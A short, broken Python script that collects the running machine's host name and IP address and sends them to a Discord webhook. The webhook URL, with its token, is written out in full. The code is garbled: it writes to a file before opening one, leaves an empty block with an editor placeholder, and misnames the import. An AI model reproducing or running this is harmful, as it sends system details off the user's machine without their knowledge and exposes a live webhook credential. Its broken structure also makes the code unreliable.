import socket
host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)
print("Host name: ", host_name, file=f)
print("Ip Address: ", ip_address, file=f)

with open('result.txt', 'wt') as f:
  
  # Tab to edit

from Discord_webhook import DiscordWebhook, DiscordEmbed
content = "Placeholder Message"
webhook = DiscordWebhook (url="https://discord.com/api/webhooks/1253727569031991316/e2A_qHbnJosj7qq-RKYZTXzmylVFnLXupqVkaPQQFRAQ8_j0v5CaxAf_uN9ck-3t6iYy", username="Batman", content=content)
embed = DiscordEmbed(title="IP: " + ip_address + " | Host: " + host_name, color = 123123)
webhook.add_embed(embed)
response = webhook.execute()